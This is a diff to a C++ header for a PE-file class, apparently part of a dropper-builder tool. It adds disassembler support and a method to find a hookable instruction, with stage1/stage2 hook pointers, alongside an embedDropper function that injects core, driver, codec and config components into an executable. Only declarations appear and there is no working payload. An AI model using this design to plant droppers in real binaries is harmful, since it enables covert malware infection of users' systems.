@@ -18,6 +18,7 @@ namespace bf = boost::filesystem;
 #include "tree.hpp"
 #include "GenericSection.h"
 #include "IATEntry.h"
+#include "../libs/BeaEngine/BeaEngine.h"
 
 #define STAGE1_STUB_SIZE 5	// call near, 32bit address
 #define PE_MAX_DATA_SECTIONS 64
@@ -101,12 +102,16 @@ private:
 		struct {
 			char* ptr;
 			DWORD va;
+			DWORD size;
 		} stage1;
 		struct {
 			char* ptr;
 			DWORD va;
+			DWORD size;
 		} stage2;
 	} _hookPointer;
+
+
 	
 	// TODO this should be removed in favor of the above map
 	DWORD _pLoadLibrary;
@@ -116,6 +121,8 @@ private:
 	bool _parseNTHeader();
 	bool _parseIAT();
 	bool _parseResources();
+	
+	void _findHookableInstruction();
 	bool _parseText();
 	
 	struct {
@@ -147,7 +154,7 @@ private:
 	bool _fixManifest();
 	std::size_t _writeResources( char* data, DWORD virtualAddress );
 	
-	void _disassembleCode(unsigned char *start, unsigned char *end, unsigned char *ep, int VA);
+	void _disassembleCode(unsigned char *start, unsigned char *end, int VA);
 	
 public:
 	PEObject(char* data, std::size_t size);
@@ -200,6 +207,13 @@ public:
 	bool isAuthenticodeSigned();
 	
 	bool embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest);
+	
+	typedef struct {
+		DISASM d;
+		std::size_t len;
+	} disassembled_instruction;
+	std::vector<disassembled_instruction> instructions_;
+	disassembled_instruction hookedInstruction_;
 	
 	IATEntry const & getIATEntry( std::string const dll, std::string const call );
 	IATEntry const & getIATEntry( DWORD const rva );
